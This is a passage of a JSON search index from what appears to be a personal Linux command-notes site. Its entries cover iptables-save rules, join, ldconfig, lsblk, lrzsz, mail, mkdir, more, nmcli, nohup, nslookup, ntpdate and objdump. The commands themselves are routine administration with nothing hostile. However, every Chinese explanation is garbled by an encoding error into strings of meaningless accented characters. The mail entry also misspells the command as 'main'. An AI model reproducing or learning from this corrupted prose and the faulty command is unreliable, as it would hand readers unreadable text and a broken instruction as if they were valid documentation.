åé¢éƒ¨åˆ†åˆ™æ˜¯ç”¨iptableså‘½ä»¤é…ç½®æ­¤è§„åˆ™çš„å‘½ä»¤ï¼ˆè¯¦è§£é€‰é¡¹å¯å‚è€ƒiptableså¸®åŠ©ï¼‰ã€‚ [0:0] -A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER [0:0] -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE [2:188] -A POSTROUTING -s 192.168.122.0/24 -d 224.0.0.0/24 -j RETURN [0:0] -A POSTROUTING -s 192.168.122.0/24 -d 255.255.255.255/32 -j RETURN [0:0] -A POSTROUTING -s 192.168.122.0/24 ! -d 192.168.122.0/24 -p tcp -j MASQUERADE --to-ports 1024-65535 [0:0] -A POSTROUTING -s 192.168.122.0/24 ! -d 192.168.122.0/24 -p udp -j MASQUERADE --to-ports 1024-65535 [0:0] -A POSTROUTING -s 192.168.122.0/24 ! -d 192.168.122.0/24 -j MASQUERADE [0:0] -A DOCKER -i docker0 -j RETURN --ä»¥ä¸Šè§„åˆ™åŒç¬¬ä¸€æ¡è§„åˆ™çš„è§£é‡Š COMMIT -- åº”ç”¨ä¸Šè¿°é…ç½® # Completed on Tue Jan 15 15:42:32 2019","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables-save.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables-save.html"},{"title":"join","text":"å¤„ç†ä¸¤ä¸ªæ–‡ä»¶ä¹‹é—´çš„æ•°æ® -t joiné»˜è®¤ä»¥ç©ºæ ¼ç¬¦åˆ†éš”æ•°æ®ï¼Œå¹¶ä¸”æ¯”å¯¹ç¬¬ä¸€ä¸ªå­—æ®µçš„æ•°æ® å¦‚æœå¿½ç•¥ä¸¤ä¸ªæ–‡ä»¶ç›¸åŒï¼Œåˆ™å°†ä¸¤ç¬”æ•°æ®è”æˆä¸€è¡Œï¼Œä¸”ç¬¬ä¸€ä¸ªå­—æ®µæ”¾åœ¨ç¬¬ä¸€ä¸ª -i å¿½ç•¥å¤§å°å†™ -1 æ•°å­—çš„1ï¼Œè¡¨ç¤ºç¬¬ä¸€ä¸ªæ–‡ä»¶è¦ç”¨å“ªä¸ªå­—æ®µæ¥åˆ†æ -2 æ•°å­—çš„2ï¼Œè¡¨ç¤ºç¬¬äºŒä¸ªæ–‡ä»¶è¦ç”¨å“ªä¸ªå­—æ®µåˆ†æ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-join.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-join.html"},{"title":"ldconfig","text":"åŠ¨æ€é“¾æ¥åº“ç®¡ç†å‘½ä»¤ï¼Œå…¶ç›®çš„ä¸ºäº†è®©åŠ¨æ€é“¾æ¥åº“ä¸ºç³»ç»Ÿæ‰€å…±äº« ldconfigçš„ä¸»è¦ç”¨é€” æœç´¢å‡ºå¯å…±äº«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œåº“æ–‡ä»¶çš„æ ¼å¼ä¸ºï¼šlib***.so.**ï¼Œè¿›è€Œåˆ›å»ºå‡ºåŠ¨æ€è£…å…¥ç¨‹åº(ld.so)æ‰€éœ€çš„é“¾æ¥å’Œç¼“å­˜æ–‡ä»¶. ç¼“å­˜æ–‡ä»¶é»˜è®¤ä¸º/etc/ld.so.cacheï¼Œè¯¥æ–‡ä»¶ä¿å­˜å·²æ’å¥½åºçš„åŠ¨æ€é“¾æ¥åº“åå­—åˆ—è¡¨. æœç´¢èŒƒå›´: é»˜è®¤æœå¯»/lilbå’Œ/usr/lib æœç´¢é…ç½®æ–‡ä»¶/etc/ld.so.confå†…æ‰€åˆ—çš„ç›®å½•ä¸‹çš„åº“æ–‡ä»¶ æ³¨è§£ ldconfigé€šå¸¸åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œï¼Œè€Œå½“ç”¨æˆ·å®‰è£…äº†ä¸€ä¸ªæ–°çš„åŠ¨æ€é“¾æ¥åº“æ—¶ï¼Œå°±éœ€è¦æ‰‹å·¥è¿è¡Œè¿™ä¸ªå‘½ä»¤ã€‚ å¾€/libå’Œ/usr/libé‡Œé¢åŠ ä¸œè¥¿ï¼Œæ˜¯ä¸ç”¨ä¿®æ”¹/etc/ld.so.confæ–‡ä»¶çš„ï¼Œ ä½†æ˜¯æ·»åŠ å®Œåéœ€è¦è°ƒç”¨ä¸‹ldconfigï¼Œä¸ç„¶æ·»åŠ çš„libraryä¼šæ‰¾ä¸åˆ°ã€‚ å¦‚æœæ·»åŠ çš„libraryä¸åœ¨/libå’Œ/usr/libé‡Œé¢çš„è¯ï¼Œå°±ä¸€å®šè¦ä¿®æ”¹/etc/ld.so.confæ–‡ä»¶ï¼Œå¾€è¯¥æ–‡ä»¶è¿½åŠ libraryæ‰€åœ¨çš„è·¯å¾„ï¼Œ ç„¶åä¹Ÿéœ€è¦é‡æ–°è°ƒç”¨ä¸‹ldconfigå‘½ä»¤ã€‚ æ¯”å¦‚åœ¨å®‰è£…MySQLçš„æ—¶å€™ï¼Œå…¶åº“æ–‡ä»¶/usr/local/mysql/libï¼Œå°±éœ€è¦è¿½åŠ åˆ°/etc/ld.so.confæ–‡ä»¶ä¸­ã€‚ å‘½ä»¤å¦‚ä¸‹: # echo \"/usr/local/mysql/lib\" >> /etc/ld.so.conf # ldconfig -v | grep mysql å¦‚æœæ·»åŠ çš„libraryä¸åœ¨/libæˆ–/usr/libä¸‹ï¼Œä½†æ˜¯å´æ²¡æœ‰æƒé™æ“ä½œå†™/etc/ld.so.confæ–‡ä»¶çš„è¯ï¼Œ è¿™æ—¶å°±éœ€è¦å¾€exporté‡Œå†™ä¸€ä¸ªå…¨å±€å˜é‡LD_LIBRARY_PATHï¼Œå°±å¯ä»¥äº† å‚æ•°è¯´æ˜ -v , --verbose æ˜¾ç¤ºæ­£åœ¨æ‰«æçš„ç›®å½•åŠæœç´¢åˆ°çš„åŠ¨æ€é“¾æ¥åº“,è¿˜æœ‰å®ƒæ‰€åˆ›å»ºçš„é“¾æ¥çš„åå­— -n <dir> ä»…æ‰«æå‘½ä»¤è¡ŒæŒ‡å®šçš„ç›®å½•,ä¸æ‰«æé»˜è®¤ç›®å½•(/lib,/usr/lib),ä¹Ÿä¸æ‰«æé…ç½®æ–‡ä»¶/etc/ld.so.confæ‰€åˆ—çš„ç›®å½•. -N ä¸é‡å»ºç¼“å­˜æ–‡ä»¶(/etc/ld.so.cache).è‹¥æœªç”¨-Xé€‰é¡¹,ldconfigç…§å¸¸æ›´æ–°æ–‡ä»¶çš„é“¾æ¥. -X ä¸æ›´æ–°æ–‡ä»¶çš„é“¾æ¥.è‹¥æœªç”¨-Né€‰é¡¹,åˆ™ç¼“å­˜æ–‡ä»¶æ­£å¸¸æ›´æ–°. -f <CONF> æŒ‡å®šåŠ¨æ€é“¾æ¥åº“çš„é…ç½®æ–‡ä»¶ä¸ºCONF,ç³»ç»Ÿé»˜è®¤ä¸º/etc/ld.so.conf. -C <CACHE> æŒ‡å®šç”Ÿæˆçš„ç¼“å­˜æ–‡ä»¶ä¸ºCACHE,ç³»ç»Ÿé»˜è®¤çš„æ˜¯/etc/ld.so.cache,æ­¤æ–‡ä»¶å­˜æ”¾å·²æ’å¥½åºçš„å¯å…±äº«çš„åŠ¨æ€é“¾æ¥åº“çš„åˆ—è¡¨. -r <ROOT> æ”¹å˜åº”ç”¨ç¨‹åºçš„æ ¹ç›®å½•ä¸ºROOT(æ˜¯è°ƒç”¨chrootå‡½æ•°å®ç°çš„). é€‰æ‹©æ­¤é¡¹æ—¶,ç³»ç»Ÿé»˜è®¤çš„é…ç½®æ–‡ä»¶/etc/ld.so.conf,å®é™…å¯¹åº”çš„ä¸ºROOT/etc/ld.so.conf. å¦‚ç”¨-r/usr/zzzæ—¶,æ‰“å¼€é…ç½®æ–‡ä»¶/etc/ld.so.confæ—¶,å®é™…æ‰“å¼€çš„æ˜¯/usr/zzz/etc/ld.so.confæ–‡ä»¶. ç”¨æ­¤é€‰é¡¹,å¯ä»¥å¤§å¤§å¢åŠ åŠ¨æ€é“¾æ¥åº“ç®¡ç†çš„çµæ´»æ€§. -l é€šå¸¸æƒ…å†µä¸‹,ldconfigæœç´¢åŠ¨æ€é“¾æ¥åº“æ—¶å°†è‡ªåŠ¨å»ºç«‹åŠ¨æ€é“¾æ¥åº“çš„é“¾æ¥. é€‰æ‹©æ­¤é¡¹æ—¶,å°†è¿›å…¥ä¸“å®¶æ¨¡å¼,éœ€è¦æ‰‹å·¥è®¾ç½®é“¾æ¥.ä¸€èˆ¬ç”¨æˆ·ä¸ç”¨æ­¤é¡¹. -p , --print-cache æŒ‡ç¤ºldconfigæ‰“å°å‡ºå½“å‰ç¼“å­˜æ–‡ä»¶æ‰€ä¿å­˜çš„æ‰€æœ‰å…±äº«åº“çš„åå­—. -c <FORMAT> , --format= <FORMAT> æŒ‡å®šç¼“å­˜æ–‡ä»¶æ‰€ä½¿ç”¨çš„æ ¼å¼,å…±æœ‰ä¸‰ç§:ld(è€æ ¼å¼),new(æ–°æ ¼å¼)å’Œcompat(å…¼å®¹æ ¼å¼,æ­¤ä¸ºé»˜è®¤æ ¼å¼). -V æ‰“å°å‡ºldconfigçš„ç‰ˆæœ¬ä¿¡æ¯,è€Œåé€€å‡º. --help , --usage æˆ–è€…ç›´æ¥æ¨ªæ  - , è®©ldconfigæ‰“å°å‡ºå…¶å¸®åŠ©ä¿¡æ¯,è€Œåé€€å‡º.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ldconfig.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ldconfig.html"},{"title":"lsblk","text":"åˆ—å‡ºæ‰€æœ‰å‚¨å­˜è£…ç½® -d ä»…åˆ—å‡ºç£ç›˜æœ¬èº«ï¼Œä¸åˆ—å‡ºåˆ†åŒºæ•°æ® -f åŒæ—¶åˆ—å‡ºç£ç›˜å†…çš„æ–‡ä»¶ç³»ç»Ÿåç§° -i ä½¿ç”¨ASCIIçš„çº¿æ®µè¾“å‡ºï¼Œä¸é€‚ç”¨å¤æ‚ç¼–ç  -m åŒæ—¶è¾“å‡ºè¯¥è£…ç½®åœ¨ /dev ä¸‹çš„æƒé™ä¿¡æ¯ -p åˆ—å‡ºè¯¥è£…ç½®çš„å®Œæ•´æ–‡ä»¶åï¼Œè€Œä¸æ˜¯ä»…åˆ—å‡ºæœ€åçš„åå­— -t åˆ—å‡ºè¯¥ç£ç›˜è£…ç½®çš„è¯¦ç»†æ•°æ®ï¼ŒåŒ…æ‹¬ç£ç›˜é˜Ÿåˆ—æœºåˆ¶ã€é¢„è¯»å†™çš„æ•°æ®é‡å¤§å°ç­‰","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lsblk.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lsblk.html"},{"title":"lszrz","text":"å®‰è£…: apt install lrzsz è¿™æ˜¯ä¸€ä¸ªå·¥å…·åŒ…, åŒ…å« sz, rzæŒ‡ä»¤, å¯ç”¨äºxshellè¿™ç§sshå·¥å…·æ—¶, å‘é€/ä¸Šä¼ æœ¬åœ°æ–‡ä»¶. sz: ä¸‹è½½ç»ˆç«¯æ–‡ä»¶åˆ°æœ¬åœ° rz: åœ¨ç»ˆç«¯ä¸‹è½½æœ¬åœ°æ–‡ä»¶ ç”¨æ³•: sz [æ–‡ä»¶å, æ”¯æŒå¤šä¸ª] # ç›´æ¥å‡ºå‘æ–‡ä»¶é€‰æ‹©æ¡†è‡ªå·±é€‰æ‹©æ–‡ä»¶ rz æ³¨è§£ åœ¨å…¬å¸å†…ç½‘æœºçš„MobaXtermä¸Šè°ƒç”¨å¤±è´¥, ä¸çŸ¥æ˜¯ç‰ˆæœ¬é—®é¢˜è¿˜æ˜¯å•¥","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lszrz.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lszrz.html"},{"title":"mail","text":"å‘é€ä¿¡æ¯ è¯­æ³•: main -s '$æ ‡é¢˜' $username@$host < $file","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mAIL.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mAIL.html"},{"title":"mkdir","text":"åˆ›å»ºæ–‡ä»¶å¤¹ -p å¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºï¼ˆå¤šçº§ç›®å½•çš„æƒ…å†µï¼‰ å¦‚æœæœ‰ ä¸ä½œæ“ä½œä¸æŠ¥é”™ -v åˆ›å»ºæ—¶è¾“å‡º","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mkdir.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mkdir.html"},{"title":"more","text":"æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ moreæ‰§è¡Œåçš„æ“ä½œé”®: ç©ºæ ¼: æ˜¾ç¤ºä¸‹ä¸€å± enter: ä¸€æ¬¡æ»šåŠ¨ä¸€è¡Œ b: å›æ»šä¸€å± f: å‰æ»šä¸€å± q: é€€å‡º /word: æœç´¢word","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-more.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-more.html"},{"title":"nmcli","text":"é…ç½®ç½‘ç»œç®¡ç†å™¨ å¦‚, è¦å°†åä¸º eth0 çš„æœ‰çº¿ç½‘ç»œæ¥å£é…ç½®ä¸ºè‡ªåŠ¨è¿æ¥: sudo nmcli connection modify eth0 connection.autoconnect yes","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-nmcli.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-nmcli.html"},{"title":"nohup","text":"ä¸æŒ‚æ–­åœ°è¿è¡Œå‘½ä»¤ã€‚no hangupçš„ç¼©å†™ï¼Œæ„å³\"ä¸æŒ‚æ–­\"ã€‚ nohupè¿è¡Œå‘½ä»¤ï¼Œå¿½ç•¥æ‰€æœ‰æŒ‚æ–­ï¼ˆSIGHUPï¼‰ä¿¡å·ï¼› ä»…ä¸æŒ‚æ–­çš„è¿è¡Œï¼Œæ³¨æ„æ²¡æœ‰åå°è¿è¡ŒåŠŸèƒ½ ç”¨nohupè¿è¡Œå‘½ä»¤å¯ä»¥ä½¿å‘½ä»¤æ°¸ä¹…çš„æ‰§è¡Œä¸‹å»ï¼Œå’Œç”¨æˆ·ç»ˆç«¯æ²¡æœ‰å…³ç³»ï¼Œ ä¾‹å¦‚æˆ‘ä»¬æ–­å¼€SSHè¿æ¥éƒ½ä¸ä¼šå½±å“ä»–çš„è¿è¡Œ &æ˜¯æŒ‡åœ¨åå°è¿è¡Œï¼Œä½†å½“ç”¨æˆ·é€€å‡º(æŒ‚èµ·)çš„æ—¶å€™ï¼Œå‘½ä»¤è‡ªåŠ¨ä¹Ÿè·Ÿç€é€€å‡º é‚£ä¹ˆï¼Œå¯ä»¥å·§å¦™çš„å§ä»–ä»¬ç»“åˆèµ·æ¥ç”¨å°±æ˜¯ nohup COMMAND & è¿™æ ·å°±èƒ½ä½¿å‘½ä»¤æ°¸ä¹…çš„åœ¨åå°æ‰§è¡Œ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-noHup.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-noHup.html"},{"title":"nslookup","text":"ä½¿ç”¨ç³»ç»Ÿé…ç½®è¿›è¡ŒåŸŸåè§£æ ç”¨æ³•: nslookup [-query=[type]] [hostname|ip] å‚æ•° -query=type æŸ¥è¯¢çš„ç±»å‹ï¼Œé™¤äº†ä¼ ç»Ÿçš„IPä¸ä¸»æœºåå¯¹åº”å¤–ï¼ŒDNSè¿˜æœ‰å¾ˆå¤šä¿¡æ¯","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-nslookup.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-nslookup.html"},{"title":"ntpdate","text":"æ£€ç´¢ipæ˜¯å¦å¯ä»¥ä½œä¸ºntpå¯¹æ—¶æœåŠ¡å™¨: ntpdate -d ip -a Keyid ä½¿ç”¨ Keyid æ¥è®¤è¯å…¨éƒ¨æ•°æ®åŒ…ã€‚ -b é€šè¿‡è°ƒç”¨ settimeofday å­ä¾‹ç¨‹æ¥å¢åŠ æ—¶é’Ÿçš„æ—¶é—´ã€‚ -d æŒ‡å®šè°ƒè¯•æ–¹å¼ã€‚åˆ¤æ–­ ntpdate å‘½ä»¤ä¼šäº§ç”Ÿä»€ä¹ˆç»“æœï¼ˆä¸äº§ç”Ÿå®é™…çš„ç»“æœï¼‰ã€‚ ç»“æœå†ç°åœ¨å±å¹•ä¸Šã€‚è¿™ä¸ªæ ‡å¿—ä½¿ç”¨æ— ç‰¹æƒçš„ç«¯å£ã€‚ -e AuthenticationDelay æŒ‡å®šå»¶è¿Ÿè®¤è¯å¤„ç†çš„æ—¶é—´ç§’æ•°ã€‚ -k KeyFile å½“ä¸ä½¿ç”¨ç¼ºçœå€¼ /etc/ntp.keys æ–‡ä»¶æ—¶ï¼Œä¸ºåŒ…å«å¯†é’¥çš„æ–‡ä»¶æŒ‡å®šä¸€ä¸ªä¸åŒçš„åç§°ã€‚ -o Version å½“è½®è¯¢å®ƒçš„å‘å‡ºæ•°æ®åŒ…æ—¶ï¼ŒæŒ‡å®šä½¿ç”¨çš„ NTP ç‰ˆæœ¬å®ç°ã€‚ Version çš„å€¼å¯ä»¥æ˜¯ 1ï¼Œ2ï¼Œ3ã€‚ç¼ºçœå€¼æ˜¯ 3ã€‚ -p Samples æŒ‡å®šä»æ¯ä¸ªæœåŠ¡å™¨è·å–çš„æ ·æœ¬çš„æ•°ç›®ã€‚ Samples çš„å€¼åœ¨ 1 å’Œ 8 ä¹‹é—´ï¼Œå¹¶åŒ…æ‹¬ 1 å’Œ 8ã€‚å®ƒçš„ç¼ºçœå€¼æ˜¯ 4ã€‚ -s æŒ‡å®šæ—¥å¿—æ“ä½œ syslog è®¾æ–½çš„ä½¿ç”¨ï¼Œè€Œä¸æ˜¯ä½¿ç”¨æ ‡å‡†è¾“å‡ºã€‚ å½“è¿è¡Œ ntpdate å‘½ä»¤å’Œ cronå‘½ä»¤æ—¶ï¼Œå®ƒæ˜¯å¾ˆæœ‰ç”¨çš„ã€‚ -t TimeOut æŒ‡å®šç­‰å¾…å“åº”çš„æ—¶é—´ã€‚ç»™å®š TimeOut çš„å€¼å››èˆäº”å…¥ä¸º 0.2 ç§’çš„å€æ•°ã€‚ç¼ºçœå€¼æ˜¯ 1 ç§’ã€‚ -u æŒ‡å®šä½¿ç”¨æ— ç‰¹æƒçš„ç«¯å£å‘é€æ•°æ®åŒ…ã€‚ å½“åœ¨ä¸€ä¸ªå¯¹ç‰¹æƒç«¯å£çš„è¾“å…¥æµé‡è¿›è¡Œé˜»æ‹¦çš„é˜²ç«å¢™åæ˜¯å¾ˆæœ‰ç›Šçš„ï¼Œ å¹¶å¸Œæœ›åœ¨é˜²ç«å¢™ä¹‹å¤–å’Œä¸»æœºåŒæ­¥ã€‚ é˜²ç«å¢™æ˜¯ä¸€ä¸ªç³»ç»Ÿæˆ–è€…è®¡ç®—æœºï¼Œå®ƒæ§åˆ¶ä»å¤–ç½‘å¯¹ä¸“ç”¨ç½‘çš„è®¿é—®ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ntpdate.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ntpdate.html"},{"title":"objdump","text":"å‚è€ƒ: https://zhuanlan.zhihu.com/p/115834125 https://blog.csdn.net/wwchao2012/article/details/79980514 æ˜¾ç¤ºäºŒè¿›åˆ¶æ–‡ä»¶ä¿¡æ¯ ç”¨æ¥æ˜¾ç¤ºä¸€ä¸ªæˆ–è€…å¤šä¸ªç›®æ ‡æ–‡ä»¶çš„ä¿¡æ¯, å¯ä»¥æ˜¯é™æ€åº“å½’æ¡£æ–‡ä»¶. è¯­æ³•: objdump [é€‰é¡¹] objfile... é€‰é¡¹: --archive-headers , -a æ˜¾ç¤ºæ¡£æ¡ˆåº“çš„æˆå‘˜ä¿¡æ¯,ç±»ä¼¼ ls -l å°† lib*.a çš„ä¿¡æ¯åˆ—å‡ºã€‚ -b bfdname , --target= bfdname æŒ‡å®šç›®æ ‡ç æ ¼å¼ã€‚ è¿™ä¸æ˜¯å¿…é¡»çš„ï¼Œ objdump èƒ½è‡ªåŠ¨è¯†åˆ«è®¸å¤šæ ¼å¼ï¼Œæ¯”å¦‚ï¼š $objdump -b oasys -m vax -h fu.o æ˜¾ç¤º fu.o çš„å¤´éƒ¨æ‘˜è¦ä¿¡æ¯ï¼Œæ˜ç¡®æŒ‡å‡ºè¯¥æ–‡ä»¶æ˜¯ Vax ç³»ç»Ÿä¸‹ç”¨ Oasys ç¼–è¯‘å™¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ã€‚ objdump -i å°†ç»™å‡ºè¿™é‡Œå¯ä»¥æŒ‡å®šçš„ç›®æ ‡ç æ ¼å¼åˆ—è¡¨ã€‚ -C , --demangle å°†åº•å±‚çš„ç¬¦å·åè§£ç æˆç”¨æˆ·çº§åå­—ï¼Œé™¤äº†å»æ‰æ‰€å¼€å¤´çš„ä¸‹åˆ’çº¿ä¹‹å¤–ï¼Œ è¿˜ä½¿å¾—C++å‡½æ•°åä»¥å¯ç†è§£çš„æ–¹å¼æ˜¾ç¤ºå‡ºæ¥ã€‚ --debugging , -g æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ã€‚ä¼å›¾è§£æä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è°ƒè¯•ä¿¡æ¯å¹¶ä»¥Cè¯­è¨€çš„è¯­æ³•æ˜¾ç¤ºå‡ºæ¥ã€‚ ä»…ä»…æ”¯æŒæŸäº›ç±»å‹çš„è°ƒè¯•ä¿¡æ¯ã€‚æœ‰äº›å…¶ä»–çš„æ ¼å¼è¢« readelf -w æ”¯æŒã€‚ -e , --debugging-tags ç±»ä¼¼ -g é€‰é¡¹ï¼Œä½†æ˜¯ç”Ÿæˆçš„ä¿¡æ¯æ˜¯å’Œ ctags å·¥å…·ç›¸å…¼å®¹çš„æ ¼å¼ã€‚ --disassemble , -d ä» objfile ä¸­åæ±‡ç¼–é‚£äº›ç‰¹å®šæŒ‡ä»¤æœºå™¨ç çš„ section ã€‚ -D , --disassemble-all ä¸ -d ç±»ä¼¼ï¼Œä½†åæ±‡ç¼–æ‰€æœ‰ section. --prefix-addresses åæ±‡ç¼–çš„æ—¶å€™ï¼Œæ˜¾ç¤ºæ¯ä¸€è¡Œçš„å®Œæ•´åœ°å€ã€‚è¿™æ˜¯ä¸€ç§æ¯”è¾ƒè€çš„åæ±‡ç¼–æ ¼å¼ -E B , -E L , --endian= <big|little> æŒ‡å®šç›®æ ‡æ–‡ä»¶çš„å°ç«¯ã€‚è¿™ä¸ªé¡¹å°†å½±å“åæ±‡ç¼–å‡ºæ¥çš„æŒ‡ä»¤ã€‚ åœ¨åæ±‡ç¼–çš„æ–‡ä»¶æ²¡æè¿°å°ç«¯ä¿¡æ¯çš„æ—¶å€™ç”¨ã€‚ ä¾‹å¦‚ S-records ã€‚ -f , --file-headers æ˜¾ç¤º objfile ä¸­æ¯ä¸ªæ–‡ä»¶çš„æ•´ä½“å¤´éƒ¨æ‘˜è¦ä¿¡æ¯ -h , --section-headers , --headers æ˜¾ç¤ºç›®æ ‡æ–‡ä»¶å„ä¸ª section çš„å¤´éƒ¨æ‘˜è¦ä¿¡æ¯ã€‚ -H , --help ç®€çŸ­çš„å¸®åŠ©ä¿¡æ¯ã€‚ -i , --info æ˜¾ç¤ºå¯¹äº -b æˆ–è€… -m é€‰é¡¹å¯ç”¨çš„æ¶æ„å’Œç›®æ ‡æ ¼å¼åˆ—è¡¨ã€‚ -j name , --section= name ä»…ä»…æ˜¾ç¤ºæŒ‡å®šåç§°ä¸º name çš„ section çš„ä¿¡æ¯ -l , --line-numbers ç”¨æ–‡ä»¶åå’Œè¡Œå·æ ‡æ³¨ç›¸åº”çš„ç›®æ ‡ä»£ç ï¼Œä»…ä»…å’Œ -d ã€ -D æˆ–è€… -r ä¸€èµ·ä½¿ç”¨ä½¿ç”¨ -ld å’Œä½¿ç”¨ -d çš„åŒºåˆ«ä¸æ˜¯å¾ˆå¤§ï¼Œ åœ¨æºç çº§è°ƒè¯•çš„æ—¶å€™æœ‰ç”¨ï¼Œè¦æ±‚ç¼–è¯‘æ—¶ä½¿ç”¨äº† -g ä¹‹ç±»çš„è°ƒè¯•ç¼–è¯‘é€‰é¡¹ã€‚ -m machine , --architecture= machine æŒ‡å®šåæ±‡ç¼–ç›®æ ‡æ–‡ä»¶æ—¶ä½¿ç”¨çš„æ¶æ„ï¼Œå½“å¾…åæ±‡ç¼–æ–‡ä»¶æœ¬èº«æ²¡æè¿°æ¶æ„ä¿¡æ¯çš„æ—¶å€™(æ¯”å¦‚ S-records )ï¼Œ è¿™ä¸ªé€‰é¡¹å¾ˆæœ‰ç”¨ã€‚å¯ä»¥ç”¨ -i é€‰é¡¹åˆ—å‡ºè¿™é‡Œèƒ½å¤ŸæŒ‡å®šçš„æ¶æ„. --reloc , -r æ˜¾ç¤ºæ–‡ä»¶çš„é‡å®šä½å…¥å£ã€‚å¦‚æœå’Œ -d æˆ–è€… -D ä¸€èµ·ä½¿ç”¨ï¼Œé‡å®šä½éƒ¨åˆ†ä»¥åæ±‡ç¼–åçš„æ ¼å¼æ˜¾ç¤ºå‡ºæ¥ã€‚ --dynamic-reloc , -R æ˜¾ç¤ºæ–‡ä»¶çš„åŠ¨æ€é‡å®šä½å…¥å£ï¼Œä»…ä»…å¯¹äºåŠ¨æ€ç›®æ ‡æ–‡ä»¶æ„ä¹‰ï¼Œæ¯”å¦‚æŸäº›å…±äº«åº“ã€‚ -s , --full-contents æ˜¾ç¤ºæŒ‡å®š section çš„å®Œæ•´å†…å®¹ã€‚é»˜è®¤æ‰€æœ‰çš„éç©º section éƒ½ä¼šè¢«æ˜¾ç¤ºã€‚ -S , --source å°½å¯èƒ½åæ±‡ç¼–å‡ºæºä»£ç ï¼Œå°¤å…¶å½“ç¼–è¯‘çš„æ—¶å€™æŒ‡å®šäº† -g è¿™ç§è°ƒè¯•å‚æ•°æ—¶ï¼Œæ•ˆæœæ¯”è¾ƒæ˜æ˜¾ã€‚éšå«äº† -d å‚æ•°ã€‚ --show-raw-insn åæ±‡ç¼–çš„æ—¶å€™ï¼Œæ˜¾ç¤ºæ¯æ¡æ±‡ç¼–æŒ‡ä»¤å¯¹åº”çš„æœºå™¨ç ï¼Œå¦‚ä¸æŒ‡å®š --prefix-addresses ï¼Œè¿™å°†æ˜¯ç¼ºçœé€‰é¡¹ã€‚ --no-show-raw-insn åæ±‡ç¼–æ—¶ï¼Œä¸æ˜¾ç¤ºæ±‡ç¼–æŒ‡ä»¤çš„æœºå™¨ç ï¼Œå¦‚ä¸æŒ‡å®š --prefix-addresses ï¼Œè¿™å°†æ˜¯ç¼ºçœé€‰é¡¹ã€‚ --start-address= address ä»æŒ‡å®šåœ°å€å¼€å§‹æ˜¾ç¤ºæ•°æ®ï¼Œè¯¥é€‰é¡¹å½±å“ -d ã€ -r å’Œ -s é€‰é¡¹çš„è¾“å‡ºã€‚ --stop-address= address æ˜¾ç¤ºæ•°æ®ç›´åˆ°æŒ‡å®šåœ°å€ä¸ºæ­¢ï¼Œè¯¥é¡¹å½±å“ -d ã€ -r å’Œ -s é€‰é¡¹çš„è¾“å‡ºã€‚ -t , --syms æ˜¾ç¤ºæ–‡ä»¶çš„ç¬¦å·è¡¨å…¥å£ã€‚ç±»ä¼¼äº nm -s æä¾›çš„ä¿¡æ¯ -T , --dynamic-syms æ˜¾ç¤ºæ–‡ä»¶çš„åŠ¨æ€ç¬¦å·è¡¨å…¥å£ï¼Œä»…ä»…å¯¹åŠ¨æ€ç›®æ ‡æ–‡ä»¶æ„ä¹‰ï¼Œæ¯”å¦‚æŸäº›å…±äº«åº“ã€‚ å®ƒæ˜¾ç¤ºçš„ä¿¡æ¯ç±»ä¼¼äº nm -D|--dynamic æ˜¾ç¤ºçš„ä¿¡æ¯ã€‚ -V , --version ç‰ˆæœ¬ä¿¡æ¯ --all-headers , -x æ˜¾ç¤ºæ‰€å¯ç”¨çš„å¤´ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç¬¦å·è¡¨ã€é‡å®šä½å…¥å£ã€‚ -x ç­‰ä»·äº -a -f -h -r -t åŒæ—¶æŒ‡å®šã€‚ -z , --disassemble-zeroes ä¸€èˆ¬åæ±‡ç¼–è¾“å‡ºå°†çœç•¥å¤§å—çš„é›¶ï¼Œè¯¥é€‰é¡¹ä½¿å¾—è¿™äº›é›¶å—ä¹Ÿè¢«åæ±‡ç¼–ã€‚ @file å¯ä»¥å°†é€‰é¡¹é›†ä¸­åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œç„¶åä½¿ç”¨è¿™ä¸ª @file 